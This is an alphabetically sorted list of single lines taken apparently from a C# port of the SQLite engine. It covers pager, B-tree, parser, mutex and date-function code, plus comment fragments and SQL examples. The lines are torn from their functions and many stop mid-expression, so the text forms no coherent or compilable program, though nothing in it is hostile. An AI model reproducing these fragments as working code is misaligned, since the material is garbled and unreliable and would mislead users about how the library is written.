      return (CURSOR_VALID != pCur.eState)
      return (Pgno)nPage
      return (char)digit
      return (int)( id.sectorSize )
      return (int)( y.iJD - x.iJD )
      return (int)( zDx )
      return (int)p.nPagecount
      return (int)p.nRemaining
      return (int)pPager.journalMode
      return (int)pPrior.Length
      return (int)sqlite3VdbeIntValue( pVal )
      return (p != null 
      return (rc == SQLITE_DONE 
      return (sqlite3_value)pOut
      return (u16)nSize
      return (u32)( ( n 
      return (u32)( ( p[0 
      return (u32)( ( p[0] << 24 ) 
      return (u32)h
      return (u8)( ( i >= 0 
      return (u8)( getSafetyLevel( z ) 
      return -1
      return -1 - i
      return 0
      return 0x3fffffff 
      return 1
      return 3096
      return 9
      return Convert.ToInt64( timeSpan.TotalSeconds )
      return EXPR_FULLSIZE
      return Encoding.UTF8.GetBytes( zBlob.ToString() )
      return Environment.OSVersion.Platform >= PlatformID.Win32NT
      return LastResult
      return MEMDB != 0
      return N < 0 
      return PAGER_LOCKINGMODE_QUERY
      return ROUND8( n )
      return ROUND8( nByte )
      return SQLITE_AFF_NUMERIC
      return SQLITE_CORRUPT
      return SQLITE_CORRUPT_BKPT()
      return SQLITE_ERROR
      return SQLITE_NOMEM
      return SQLITE_OK
      return TK_ID
      return WHERE_ORDERBY_NORMAL
      return WRC_Abort
      return WRC_Continue
      return WRC_Prune
      return a
      return aPayload
      return addr
      return aff
      return azName[i]
      return bytesPerSector == 0 
      return c
      return c0 
      return c0 == 0 
      return cksum
      return cnt
      return columnName(
      return context.pColl
      return db.autoCommit
      return db.errCode
      return db.errCode 
      return db.lastRowid
      return db.mutex
      return db.nChange
      return db.nTotalChange
      return depth 
      return eType
      return elem != null 
      return false
      return h 
      return head.pRight
      return i
      return i - 1
      return iDb
      return iReg
      return iType
      return id.pMethods.xDeviceCharacteristics( id )
      return idx
      return inReg
      return info.nSize
      return jointype
      return logN
      return mask
      return match
      return memId
      return n
      return n 
      return n == 0
      return nByte
      return nErr
      return nFull
      return nHeight
      return nPage
      return nSize
      return new byte[nByte]
      return notReady
      return null
      return offset
      return oldLimit
      return op == TK_IN 
      return p
      return p.azVar[i - 1]
      return p.iSize
      return p.inTrans != TRANS_NONE
      return p.nBackup != 0
      return p.nOp
      return p.nRef
      return p.pBt.pPager
      return p.pBt.pageSize
      return p.pFunc.pUserData
      return p.pMem.n
      return p.rc 
      return p.s.db
      return p.zText.ToString()
      return pArray
      return pBt.pSchema
      return pCache
      return pCache.nMax
      return pCache.nRef
      return pColl
      return pCur != null 
      return pCur.cachedRowid
      return pCx
      return pDb.aDb[i].pBt
      return pExpr
      return pExpr.affinity
      return pInfo
      return pJfd.pMethods == MemJournalMethods
      return pKey
      return pList
      return pMem._Mem
      return pMem.type
      return pMem.z != null 
      return pNew
      return pNext
      return pOld
      return pOut
      return pPage
      return pPager.exclusiveMode
      return pPager.fd
      return pPager.journalSizeLimit
      return pPager.memDb != 0
      return pPager.mxPgno
      return pPager.noSync
      return pPager.pBackup
      return pPager.pTmpSpace
      return pPager.pVfs
      return pPager.readOnly
      return pPager.zFilename
      return pPager.zJournal
      return pParse.aTempReg[--pParse.nTempReg]
      return pParser
      return pPg
      return pPg.pData
      return pPg.pExtra
      return pPg.pgno
      return pPrior
      return pRet
      return pSrc
      return pStmt != null 
      return pTab
      return pTriggerStep
      return pVdbeFunc.apAux[iArg].pAux
      return pVfs
      return pVm != null 
      return pVm.nResColumn
      return pWInfo
      return pcacheSortDirtyList( pCache.pDirty )
      return pval.type
      return r
      return r2
      return rc
      return rc 
      return regBase
      return res
      return result
      return result.pDirty
      return ret
      return sbZ.Length
      return sqlite3GlobalConfig.m.xInit( sqlite3GlobalConfig.m.pAppData )
      return sqlite3GlobalConfig.m.xSize( p )
      return sqlite3GlobalConfig.pcache.xInit( sqlite3GlobalConfig.pcache.pArg )
      return sqlite3InvokeBusyHandler(pBt.db.busyHandler)
      return sqlite3Malloc( n )
      return sqlite3PagerFilename(p.pBt.pPager)
      return sqlite3PagerJournalname(p.pBt.pPager)
      return sqlite3PcachePageRefcount( pPage )
      return sqlite3PcacheRefCount( pPager.pPCache )
      return sqlite3StrAccumFinish(sCheck.errMsg)
      return sqlite3VdbeIntValue( pVal )
      return sqlite3VdbeRealValue( pVal )
      return sqlite3_finalize( ref pStmt )
      return sqlite3_mutex_held(p.pBt.mutex)
      return target
      return tm
      return true
      return unixStartTime.AddSeconds( Convert.ToDouble( unixTime ) )
      return v
      return v.db
      return val
      return vm
      return vm.pResultSet == null 
      return w.u.i
      return wsdPrng.s[t]
      return wsdStat.nowValue[op]
      return yy_action[i]
      return yymajor
      return z
      return zBuf.ToString()
      return zFilename
      return zIndex == z.Length 
      return zName
      return zStmt.ToString()
      return zString.Length == 0
      return zTemp.ToString()
      return zType
      return zWhere
      returned.
      rollback at any point in the future.
      rowSetToList( p )
      rowid = v.u.i
      rules/specifications for math functions.
      s 
      s -= p.h 
      s = (int)( ( p.iJD 
      s = (int)p.s
      s = a
      s = s << 4
      s = s << 7
      sAggInfo = new AggInfo()
      sCheck.anRef = new int[sCheck.nPage 
      sCheck.anRef = null
      sCheck.mxErr = mxErr
      sCheck.nErr = 0
      sCheck.nPage = pagerPagecount(sCheck.pBt)
      sCheck.pBt = pBt
      sCheck.pPager = pBt.pPager
      sContext = new AuthContext()
      sEnd = pParse.sLastToken
      sEnd.n = 0
      sEnd.n = 1
      sEnd.z = z.Substring( n - 1 )
      sInfo.db = db
      sInfo.zDatabase )
      sInfo.zDatabase = db.aDb[iDb].zName
      sNC = new NameContext()
      sNC.pParse = pParse
      sNC.pSrcList = pSelect.pSrc
      sNC.pSrcList = pTabList
      sName = new NameContext()
      sName.pParse = pParse
      sPragmaType p
      sPragmaType[] aPragma = new sPragmaType[]{
      savedFlags = db.flags
      savedHasAgg = pNC.hasAgg
      savedLimit = p.iLimit
      savedOffset = p.iOffset
      saved_cnt = sqlite3_io_error_pending.iValue
      saved_flags = db.flags
      saved_nChange = db.nChange
      saved_nTotalChange = db.nTotalChange
      scratchAllocOut = ( p != null ) 
      scratchAllocOut = p != null 
      set pUnlockConnection=0.
      set to db. This is used when closing connection db.
      setSectorSize( pPager )
      shortNames = ( db.flags 
      siblings when this function was called. These have already
      spaceLeft = info.nLocal
      sqlite3 db
      sqlite3 db = (sqlite3)ptr
      sqlite3 db = (sqlite3)sqlite3_context_db_handle( context )
      sqlite3 db = null
      sqlite3 db = p.db
      sqlite3 db = p.pTable.dbMem
      sqlite3 db = pData.db
      sqlite3 db = pMem.db
      sqlite3 db = pParse.db
      sqlite3 db = pTable.dbMem
      sqlite3 db = pWC.pParse.db
      sqlite3 db = sqlite3_context_db_handle( context )
      sqlite3AlterFunctions( db )
      sqlite3AutoLoadExtensions( db )
      sqlite3BeginBenignMalloc()
      sqlite3BitvecDestroy( ref pBitvec )
      sqlite3BitvecDestroy( ref pDone )
      sqlite3BitvecDestroy(ref pBt.pHasContent)
      sqlite3BtreeClearTable()
      sqlite3BtreeClose( ref pDb.pBt )
      sqlite3BtreeCreateIndex()
      sqlite3BtreeCreateTable()
      sqlite3BtreeDelete()
      sqlite3BtreeDropTable()
      sqlite3BtreeEnter( p.pSrc )
      sqlite3BtreeEnter( pDb.pBt )
      sqlite3BtreeEnter( pFrom )
      sqlite3BtreeEnter( pTo )
      sqlite3BtreeEnter(p)
      sqlite3BtreeEnter(pBtree)
      sqlite3BtreeEnterAll( db )
      sqlite3BtreeInsert()
      sqlite3BtreeLeave( p.pSrc )
      sqlite3BtreeLeave( pDb.pBt )
      sqlite3BtreeLeave( pFrom )
      sqlite3BtreeLeave( pTo )
      sqlite3BtreeLeave(p)
      sqlite3BtreeLeave(pBtree)
      sqlite3BtreeLeaveAll( db )
      sqlite3BtreeMutexArrayLeave( p.aMutex )
      sqlite3BtreePager( p.pSrc ).pBackup = p
      sqlite3BtreeRollback( p.pDest )
      sqlite3BtreeRollback(p)
      sqlite3BtreeUpdateMeta()
      sqlite3CloseExtensions( db )
      sqlite3CloseSavepoints( db )
      sqlite3ConnectionClosed( db )
      sqlite3DefaultRowEst( pIndex )
      sqlite3DeleteTable( ref p )
      sqlite3DeleteTable( ref pItem.pTab )
      sqlite3Dequote( ref pFKey.zTo )
      sqlite3EndBenignMalloc()
      sqlite3ExprCacheClear( pParse )
      sqlite3ExprCachePush( pParse )
      sqlite3GlobalConfig.nLookaside )
      sqlite3GlobalConfig.nRefInitMutex--
      sqlite3HashClear( db.aCollSeq )
      sqlite3HashClear( pSchema.idxHash )
      sqlite3HashClear( temp1 )
      sqlite3HashClear( temp2 )
      sqlite3HashInit( db.aCollSeq )
      sqlite3HashInit( pSchema.trigHash )
      sqlite3MemJournalOpen( pJfd )
      sqlite3OsClose( pPager.fd )
      sqlite3PagerUnref(pDbPage)
      sqlite3PagerUnref(pRoot.pDbPage)
      sqlite3PcacheClose( pPager.pPCache )
      sqlite3PcacheMakeDirty( pPg )
      sqlite3PcacheRef( pPg )
      sqlite3PrintExprList( p.pEList )
      sqlite3Prng = sqlite3SavedPrng.Copy()
      sqlite3Prng.isInit = false
      sqlite3PrngType wsdPrng = sqlite3Prng
      sqlite3RegisterBuiltinFunctions( db )
      sqlite3RegisterDateTimeFunctions()
      sqlite3SafetyOff( db )
      sqlite3SafetyOn( db )
      sqlite3SavedPrng = sqlite3Prng.Copy()
      sqlite3StrAccumFinish( acc )
      sqlite3VdbeDelete( ref p )
      sqlite3VdbeFinalize( (Vdbe)pNew )
      sqlite3VdbeFinalize(pParse->pVdbe)
      sqlite3VdbeHalt( p )
      sqlite3VdbeIOTraceSql( p )
      sqlite3VdbeMemRelease( m )
      sqlite3VdbeMemRelease( pMem )
      sqlite3VdbeMemRelease( pTo )
      sqlite3VdbeMemRelease( pVar )
      sqlite3VdbeMemRelease( v )
      sqlite3VdbeMemReleaseExternal( p )
      sqlite3VdbeMemReleaseExternal( pTo )
      sqlite3VdbeMemSetNull( pCtx.s )
      sqlite3VdbeMutexArrayEnter( p )
      sqlite3VdbeResetStepResult( (Vdbe)pNew )
      sqlite3VtabClear( pTable )
      sqlite3VtabRollback( db )
      sqlite3VtabUnlock(p)
      sqlite3VtabUnlock(pVTab)
      sqlite3VtabUnlock(pVTable)
      sqlite3VtabUnlockList( db )
      sqlite3WhereEnd( pWInfo )
      sqlite3_backup b
      sqlite3_backup p
      sqlite3_backup pp
      sqlite3_column_text() is called.  The content must be converted
      sqlite3_column_text16() is called.  A zero-terminator might
      sqlite3_column_text16() is called.  The content must be converted
      sqlite3_file jfd
      sqlite3_file pFile
      sqlite3_file pFile = (sqlite3_file)id
      sqlite3_file pFile = id
      sqlite3_file pJournal
      sqlite3_file pMaster
      sqlite3_initialize()
      sqlite3_int64 res
      sqlite3_int64 timeF
      sqlite3_int64 timeW
      sqlite3_io_error_hit.iValue
      sqlite3_io_error_pending.iValue = -1
      sqlite3_io_error_pending.iValue = saved_cnt
      sqlite3_mem_methods defaultMethods = new sqlite3_mem_methods(
      sqlite3_mutex mutex
      sqlite3_mutex mutexOpen = null
      sqlite3_mutex pMaster
      sqlite3_mutex_enter( db.mutex )
      sqlite3_mutex_enter( mem0.mutex )
      sqlite3_mutex_enter( mutex )
      sqlite3_mutex_enter( p.db.mutex )
      sqlite3_mutex_enter( p.pSrcDb.mutex )
      sqlite3_mutex_enter( pDb.mutex )
      sqlite3_mutex_enter( pDestDb.mutex )
      sqlite3_mutex_enter( pMaster )
      sqlite3_mutex_enter( pSrcDb.mutex )
      sqlite3_mutex_enter( pTo.db.mutex )
      sqlite3_mutex_enter( sqlite3GlobalConfig.pInitMutex )
      sqlite3_mutex_free( ref db.mutex )
      sqlite3_mutex_leave( db.mutex )
      sqlite3_mutex_leave( mem0.mutex )
      sqlite3_mutex_leave( mutex )
      sqlite3_mutex_leave( p.pSrcDb.mutex )
      sqlite3_mutex_leave( pDb.mutex )
      sqlite3_mutex_leave( pDestDb.mutex )
      sqlite3_mutex_leave( pMaster )
      sqlite3_mutex_leave( pSrcDb.mutex )
      sqlite3_mutex_leave( pTo.db.mutex )
      sqlite3_mutex_leave( sqlite3GlobalConfig.pInitMutex )
      sqlite3_open_file_count.iValue 
      sqlite3_opentemp_count.iValue
      sqlite3_pager_readdb_count.iValue = iValue
      sqlite3_pcache_methods defaultMethods = new sqlite3_pcache_methods(
      sqlite3_query_plan.Trim()
      sqlite3_release_memory( allocSize )
      sqlite3_stmt pNew = new sqlite3_stmt()
      sqlite3_stmt pNext
      sqlite3_stmt pStmt = null
      sqlite3_sync_count
      sqlite3_value pRes
      sqlite3_value pVal = null
      sqlite3_vfs pVfs
      sqlite3_vfs pVfs = db.pVfs
      sqlite3_vfs pVfs = null
      sqlite3_vfs pVfs = pPager.pVfs
      sqlite3_vtab 
      sqlite3_vtab pVtab
      sqlite3_xferopt_count.iValue
      sqliteResetColumnNames( pTable )
      sqlite_int64 r = 0
      sqlite_int64 v = 0
      string Dummy = null
      string bResult = sqlite3_value_text( argv[0] )
      string inPattern = zPattern
      string master_schema =
      string pzTail = null
      string ret = null
      string temp_master_schema =
      string z
      string z = pColl.zName
      string z1
      string z2
      string zBuf
      string zCharSet
      string zCol
      string zColl
      string zConverted
      string zConverted = convertUtf8Filename( zFilename )
      string zDate1 = zDate.Substring( zDate.IndexOf( nextC0 ) 
      string zDb
      string zDb = null
      string zErr
      string zFile
      string zFile = sqlite3_value_text( argv[0] )
      string zIdent = zSignedIdent
      string zIn
      string zLeft = null
      string zMasterJournal = null
      string zMasterName = SCHEMA_TABLE( iDb )
      string zMasterSchema
      string zName
      string zName = context.pFunc.zName
      string zName = null
      string zName = p.zName
      string zName = zName = argv[0].z != null 
      string zOriginCol = null
      string zOriginDb = null
      string zOriginTab = null
      string zOut
      string zOut = null
      string zP4
      string zPattern
      string zProc
      string zPtr = null
      string zRep
      string zRet
      string zRight = null
      string zSavedAuthContext = pParse.zAuthContext
      string zSep
      string zSql
      string zSql = bResult == null 
      string zSql = sqlite3_value_text( argv[0] )
      string zStr
      string zTab
      string zTabName
      string zTableName = sqlite3_value_text( argv[1] )
      string zText = new string( new char[540]  {
      string zTmp
      string zType = null
      string zUtf8Name = zName
      string zVal
      string zWhere
      string[] aMsg = new string[]{
      string[] argv = (string[])Oargv
      string[] argv = (string[])p2
      string[] azArg = new string[4]
      string[] azCols = null
      switch ( action )
      switch ( aff )
      switch ( eDest )
      switch ( flags )
      switch ( id )
      switch ( op )
      switch ( p.op )
      switch ( pDest.eDest )
      switch ( pExpr.op )
      switch ( pOp.p4type )
      switch ( pValue.type )
      switch ( quote )
      switch ( serial_type )
      switch ( sqlite3_value_type( argv[0] ) )
      switch ( sysType )
      switch ( z[0] )
      switch ( z[iOffset 
      switch (yymajor)
      switch (yyruleno)
      szCell = new u16[nMaxCells]
      szJ = pPager.journalOff
      szNew[k] = subtotal
      t 
      t = (long)( x.iJD / 1000 - 210866760000L )
      t = wsdPrng.s[(u8)wsdPrng.i]
      temp = sqlite3PagerTempSpace(pPage.pBt.pPager)
      temp1 = pSchema.tblHash
      temp2 = pSchema.trigHash
      testcase( (u32)m.n == szHdr 
      testcase( db == null )
      testcase( enc2 == SQLITE_UTF16 )
      testcase( enc2 == SQLITE_UTF16_ALIGNED )
      testcase( mask == 0 )
      testcase( n == db.aLimit[SQLITE_LIMIT_LENGTH] 
      testcase( n == db.aLimit[SQLITE_LIMIT_LENGTH] )
      testcase( nPat == db.aLimit[SQLITE_LIMIT_LIKE_PATTERN_LENGTH] 
      testcase( nPat == db.aLimit[SQLITE_LIMIT_LIKE_PATTERN_LENGTH] )
      testcase( pEList != null 
      testcase( pPager.dbSizeValid == false )
      testcase( rc )
      testcase( szHdr == 3 )
      testcase( szHdr == m.n )
      testcase( typeRowid == 1 )
      testcase( typeRowid == 2 )
      testcase( typeRowid == 3 )
      testcase( typeRowid == 4 )
      testcase( typeRowid == 5 )
      testcase( typeRowid == 6 )
      testcase( typeRowid == 8 )
      testcase( typeRowid == 9 )
      testcase(gap 
      testcase(gap == top)
      testcase(n == mxPage - 1)
      testcase(nPayload == pPage.maxLocal 
      testcase(nPayload == pPage.maxLocal)
      testcase(nSize == pPage.maxLocal 
      testcase(nSize == pPage.maxLocal)
      testcase(pc 
      testcase(pgno == 0)
      testcase(pgno == iLastPg)
      the 'change-counter' field of the database file header and
      the contents of the page cache and rolling back any open journal
      the database handle mutex is held.
      the information used by the action routines in the grammar.
      the sqlite3.pDisconnect list. In this case either the BtShared mutex
      then an attempt is made to clear the error state by discarding
      then attempt to recycle a page from the LRU list. If it is the right
      timeF = timeF 
      timeF = timeF % ntuPerDay
      timeF = timeW % ntuPerDay
      timeW = System.DateTime.UtcNow.ToFileTime()
      timeW = timeW 
      timeW = timeW / ntuPerDay
      time_t t
      tm tm = new tm()
      tm.tm_hour = RefTime.Hour
      tm.tm_isdst = RefTime.IsDaylightSavingTime() 
      tm.tm_mday = RefTime.Day
      tm.tm_min = RefTime.Minute
      tm.tm_mon = RefTime.Month
      tm.tm_sec = RefTime.Second
      tm.tm_wday = (int)RefTime.DayOfWeek
      tm.tm_yday = RefTime.DayOfYear
      tm.tm_year = RefTime.Year
      tmp.CopyTo( pB )
      to UTF-16.</li>
      to UTF-8.</li>
      to be updated.
      to step 2.  Do this zero or more times.
      to the page size.
      tokenType = TK_ILLEGAL
      top -= nByte
      trigStackEntry.newColMask = 0
      trigStackEntry.oldColMask = 0
      try
      turned off.
      type = pFile.locktype
      type = sqlite3_value_numeric_type( argv[0] )
      u = 0
      u16 c
      u16 expLeft = (u16)( pExpr.pLeft.flags 
      u16 expRight = (u16)( pExpr.pRight.flags 
      u16 first
      u16 flags = 0
      u16 leafCorrection
      u16 n
      u16 ovflPageSize
      u16 szPageDflt = SQLITE_DEFAULT_PAGE_SIZE
      u16[] szCell
      u32 cksum = 0
      u32 cksum = pPager.cksumInit
      u32 cookie = 0
      u32 eqTermMask
      u32 h
      u32 i
      u32 idx
      u32 idx1
      u32 k
      u32 len
      u32 lenRowid
      u32 magic
      u32 mask
      u32 mxPg = 0
      u32 n
      u32 nHeader = (u32)pPager.pageSize
      u32 nKey
      u32 nLocal
      u32 nNew
      u32 nPage = 0
      u32 nPagePerSector = (u32)( pPager.sectorSize / pPager.pageSize )
      u32 nPayload = 0
      u32 nPinned
      u32 nRec = 0
      u32 nSize = 0
      u32 nWrite
      u32 needSyncPgno = 0
      u32 new_col_mask = 0
      u32 old_col_mask = 0
      u32 pBufOffset = 0
      u32 pgno = pPg.pgno
      u32 szHdr = 0
      u32 szHdr1
      u32 typeRowid = 0
      u32 u
      u32 u32_pRes = 0
      u32 u32_v = 0
      u32 wsFlags
      u32[] meta = new u32[5]
      u32[] pTmpSpace
      u64 u64_v = 0
      u8 aff = (u8)sqlite3ExprAffinity( pExpr2 )
      u8 av = (u8)autoVacuum
      u8 c1 = (u8)pDef.zName[0]
      u8 createStat1 = 0
      u8 eLock
      u8 ePtrmapType = 0
      u8 enc = db.aDb[0].pSchema.enc
      u8 encoding = ENC( db )
      u8 hdr = pPage.hdrOffset
      u8 initbusy = db.init.busy
      u8 isInitOrig = pPage.isInit
      u8 memDb = 0
      u8 nReserve
      u8 okOnePass
      u8 pPtr
      u8 pik_flags
      u8 ptr
      u8 savedHasAgg
      u8 t
      u8 tempFile = 0
      u8[] aBalanceQuickSpace = new u8[13]
      u8[] aData
      u8[] buf = new u8[10]
      u8[] data
      u8[] data = pPage.aData
      u8[] pFree = null
      u8[] pPtrmap
      u8[] pSrc
      u8[][] apCell = null
      u8[][] trans = new u8[][]       {
      union_p4 _p4 = new union_p4()
      usableSize = pBt.usableSize
      usableSize = pPage.pBt.usableSize
      usableSpace = pBt.usableSize - 12 
      v = ( (u64)s ) << 32 
      v = (i64)u64_v
      v = (int)u32_v
      v = (int)u64_v
      v = (u32)u64_v
      v = pParse.pVdbe
      v = p[0]
      v = p[offset 
      v = p[offset]
      v = s[(int)offset]
      v = sqlite3GetVdbe( p )
      v = sqlite3GetVdbe( pParse )
      v.changeCntOn = true
      vaFORMAT = zFormat
      vaNEXT 
      vaNEXT = 0
      va_end( ap )
      va_end(ap)
      val = ( val - d ) 
      val = 0
      vfsFlags 
      vfsUnlink( pVfs )
      vm = null
      w.pParse = pNC.pParse
      w.pParse = pParse
      w.u.i = initFlag
      w.u.pNC = pNC
      w.u.pNC = pOuterNC
      w.xExprCallback = (dxExprCallback)analyzeAggregate
      w.xExprCallback = (dxExprCallback)evalConstExpr
      w.xExprCallback = exprNodeIsConstant
      w.xExprCallback = exprWalkNoop
      w.xExprCallback = resolveExprStep
      w.xSelectCallback = (dxSelectCallback)analyzeAggregatesInSelect
      w.xSelectCallback = null
      w.xSelectCallback = resolveSelectStep
      w.xSelectCallback = selectAddSubqueryTypeInfo
      w.xSelectCallback = selectExpander
      w.xSelectCallback = selectNodeIsConstant
      whereClauseClear( p.wc )
      which depend on an exact implementation of IEEE or ISO
      which is played back if present. Following any hot-journal
      while ( ( op = aOp[pc] ) != 0 )
      while ( ( p = pCache.pDirty ) != null )
      while ( ( p.iSize > BITVEC_NBIT ) 
      while ( ( rc == SQLITE_OK 
      while ( /
      while ( ALWAYS( n > 0 ) 
      while ( ALWAYS( p != null ) )
      while ( N > x )
      while ( N-- != 0 )
      while ( N-- > 0 
      while ( N-- > 0 )
      while ( SQLITE_ROW == sqlite3_step( pStmt ) )
      while ( a < zLeft.Length 
      while ( count-- > 0 
      while ( db.pSavepoint != null )
      while ( elem != null )
      while ( i > 0 )
      while ( i >= 1 )
      while ( iFirst < pList.nExpr )
      while ( iZnum < zNum.Length 
      while ( idx < (int)szHdr 
      while ( idx1 < szHdr1 
      while ( n > 0 
      while ( n-- > 0 )
      while ( nKey > 0 )
      while ( nWrite > 0 )
      while ( p != null )
      while ( p.iDivisor != 0 )
      while ( p.op == TK_UPLUS ) p = p.pLeft
      while ( p.pEntry != null )
      while ( pA != null 
      while ( pChunk != null )
      while ( pExpr != null )
      while ( pIn != null )
      while ( pLeft.op == TK_UPLUS ) pLeft = pLeft.pLeft
      while ( pNC != null 
      while ( pParse.pAinc != null )
      while ( pParse.pZombieTab != null )
      while ( pRight.op == TK_UPLUS ) pRight = pRight.pLeft
      while ( pS != null )
      while ( pSelect != null 
      while ( pSelect != null )
      while ( pSelect.pPrior != null )
      while ( pSelect.pPrior != null ) pSelect = pSelect.pPrior
      while ( pStep != null )
      while ( pStepList != null )
      while ( pTriggerStep != null )
      while ( pcache1.nCurrentPage > pcache1.nMaxPage 
      while ( pp != pPage )
      while ( rc == SQLITE_OK 
      while ( true )
      while ( zIdx < zSql.Length )
      while ( zIndex < z.Length 
      while ( zIndex < zDate.Length 
      while (N-- > 0 
      while (i < nOld)
      while (nOvfl-- != 0)
      while (nPayload > 0)
      while (pCur != null)
      while (pParser.yyidx >= 0) yy_pop_parser_stack(pParser)
      while (rc == SQLITE_OK 
      while (rc == SQLITE_OK)
      while (true)
      while (yypParser.yyidx >= 0) yy_pop_parser_stack(yypParser)
      why bother journalling it
      wrote = id.fs.Position
      wsdAutoextInit()
      wsdHooks.xBenignBegin = xBenignBegin
      wsdHooks.xBenignEnd = xBenignEnd
      wsdHooksInit()
      wsdPrng.i
      wsdPrng.j = (u8)( wsdPrng.j 
      wsdPrng.s[(u8)wsdPrng.i] = wsdPrng.s[wsdPrng.j]
      wsdPrng.s[wsdPrng.j] = t
      wsdStat.nowValue[op] 
      wsdStat.nowValue[op] = X
      wsdStatInit()
      x = expr1  OR  expr2 = x  OR  x = expr3
      x = null
      x = p
      x.n = !String.IsNullOrEmpty( zToken ) 
      x.tz = 0
      x.validJD = 0
      x.z = zToken
      xUnlockNotify are grouped together.
      y.validHMS = 1
      y.validJD = 0
      y.validTZ = 0
      y.validYMD = 1
      yColCache p
      yyParser pEngine
      yyParser pParser = new yyParser()
      yyParser pParser = p
      yyParser yypParser
      yyStackEntry yytos = new yyStackEntry()
      yyStackEntry yytos = pParser.yystack[pParser.yyidx]
      yyTraceFILE = TraceFILE
      yyTracePrompt = zTracePrompt
      yy_action[ yy_shift_ofst[S] 
      yyendofinput = (yymajor == 0)
      yygoto = yyRuleInfo[yyruleno].lhs
      yygotominor = new YYMINORTYPE()
      yymajor = yytos.major
      yyminorunion.yy0 = yyminor.Copy()
      yymsp yymsp
      yypParser = yyp
      yypParser.pParse = pParse
      yypParser.yyidx
      yypParser.yyidx -= yysize
      yypParser.yyidx--
      yypParser.yystack[yypParser.yyidx] = yytos
      yysize = yyRuleInfo[yyruleno].nrhs
      yytos.major = (YYCODETYPE)yyMajor
      yytos.minor = yypMinor
      yytos.stateno = (YYACTIONTYPE)yyNewState
      z = argv[1]
      z = pBegin.z
      z = pExpr.u.zToken
      z = pRight.u.zToken
      z = sbZ.ToString()
      z = sqlite3StrAccumFinish( acc )
      z = z.Trim() 
      z2 = sqlite3_value_text( argv[0] )
      zA = sqlite3_value_text( argv[1] )
      zB = sqlite3_value_text( argv[0] )
      zBlob = new StringBuilder( n / 2 
      zBlob = sqlite3_value_blob( argv[0] )
      zBuf = new Win32Exception( Marshal.GetLastWin32Error() ).Message
      zBuf.Append( Path.GetTempPath() 
      zBuf.Append( sqlite3StrAccumFinish( acc ) )
      zBuf.Length = 0
      zConverted = zUtf8Name
      zDate = zDate.Trim()
      zDb = db.aDb[iDb].zName
      zDb = pDb.zName
      zDb = pFix.zDb
      zDb = pId2.n > 0 
      zDb = pName.a[0].zDatabase
      zErr = sqlite3_mprintf(
      zExtra = new StringBuilder( nName 
      zFile = argv[0].z != null 
      zIn = sqlite3_value_text( argv[0] )
      zIn = zIn.ToLower()
      zIndex
      zIndex 
      zMaster = new byte[pPager.pVfs.mxPathname 
      zMasterName = SCHEMA_TABLE( iDb )
      zMaster[0] = 0
      zName = argv[1].z != null 
      zName = pName.a[0].zName
      zName = pTrig.name
      zNum = zNum.Trim() 
      zPattern = sqlite3_value_text( argv[1] )
      zRep = sqlite3_value_text( argv[2] )
      zSql = sqlite3_sql( (sqlite3_stmt)p )
      zStmt = new StringBuilder( n )
      zStmt.Append( '(' )
      zStmt.Append( zEnd )
      zStr = sqlite3_value_text( argv[0] )
      zTab = pNew.zName.Substring( 16 )
      zTab = pTabList.a[0].zName
      zTabName = pTab.zName
      zTmp = pA.zSql
      {
      {                              /
      {          /
      {      /
      {  /
      { //(int)(yyRuleName.Length/sizeof(yyRuleName[0])) ){
      { }
      {//
      {// 
      {//pItem
      {//sqliteHashFirst(db.aCollSeq)
      }
      }  /
      } /
      } else
      } pzNext = zIn.Substring( zIndex )
      } return rc
      } while ( !rc 
      } while ( i < p.nOp 
      } while ( nRead >= 0 
      } while ( p.u.aHash[h] != 0 )
      } while ( v != 0 
      } while ( v != 0 )
      } while (rc == SQLITE_BUSY 
      } while (rc == SQLITE_OK)
      } while (yymajor != YYNOCODE 
      } zMaster = null
      }/
     $Header$
     (1) SHARED_LOCK
     (2) RESERVED_LOCK
     (3) PENDING_LOCK
     (4) EXCLUSIVE_LOCK
     (A)     t1.x=t2.y OR t1.x=t2.z OR t1.y=15 OR t1.z=t3.a
     (B)     x=expr1 OR expr2=x OR x=expr3
     (C)     t1.x=t2.y OR (t1.x=t2.z AND t1.y=15)
     (D)     x=expr1 OR (y>11 AND y<22 AND z LIKE '
     (E)     (p.a=1 AND q.b=2 AND r.c=3) OR (p.x=4 AND q.y=5 AND r.z=6)
     (SELECT a FROM b)          -- subquery
     )
     ) WHERE a!=5 ORDER BY 1
     ------------    -------------------------------------------
     ... WHERE  (a=5) AND (b=7 OR c=9 OR d=13) AND (d=13)
     /
     //
     // do something with pData
     //)(void
     0 
     0xd800 and 0xe000 then it is rendered as 0xfffd.
     0xfe 0xff   big-endian utf-16 follows
     0xff 0xfe   little-endian utf-16 follows
     16       2     Page size in bytes.
     18       1     File format write version
     19       1     File format read version
     2
     2) The number of locks held by other connections drops to zero.
     2-byte pointer to the cell
     2. The table is not a view and the column name identified an
     20       1     Bytes of unused space at the end of each page
     21       1     Max embedded payload fraction
     22       1     Min embedded payload fraction
     23       1     Min leaf payload fraction
     24       4     File change counter
     28       4     Reserved for future use
     32       4     First freelist page
     36       4     Number of freelist pages in the file
     4-byte child pointer
     4-byte nData value
     4-byte overflow page pointer
     40       4     Schema cookie
     40      60     15 4-byte meta values passed to higher layers
     44       4     File format of schema layer
     48       4     Size of page cache
     52       4     Largest root-page (auto/incr_vacuum)
     56       4     1=UTF-8 2=UTF16le 3=UTF16be
     60       4     User version
     64       4     Incremental vacuum mode
     68       4     unused
     72       4     unused
     76       4     unused
     9-byte nKey value
     <journal page X>
     <li><b>sqlite3_backup_finish()</b> is called to release all resources 
     <li><b>sqlite3_backup_init()</b> is called once to initialize the
     <li><b>sqlite3_backup_step()</b> is called one or more times to transfer 
     <modify page X>
     ATTACH => ID 
     ATTACH DATABASE abc
     ATTACH DATABASE abc AS def
     ATTACH DATABASE x AS y KEY z
     ATTACH p AS pDbname KEY pKey
     BEFORE => ID 
     BEGIN TRANSACTION
     BTREE_INTKEY
     BTREE_ZERODATA                  Used for SQL indices
     COMMIT
     COMMIT => nothing 
     CREATE => nothing 
     CREATE INDEX
     CREATE TABLE
     CREATE TABLE ex1(
     CREATE TABLE main.ex1(a)
     CREATE TEMP VIEW ex1 AS SELECT a FROM ex1
     CREATE VIEW one AS SELECT 
     CREATE VIEW two AS SELECT 
     DELETE FROM table_wxyz WHERE a<5 AND b NOT NULL
     DELETE FROM table_wxyz WHERE a<5 ORDER BY a LIMIT 1
     DETACH => ID 
     DETACH DATABASE x
     DETACH pDbname
     DROP INDEX
     DROP TABLE
     Data
     Database file handle            (pVfs.szOsFile bytes)
     Database file name              (nPathname
     Debug.Assert(zBuf[0]=='
     Do not deviate from the formatting style currently in use.
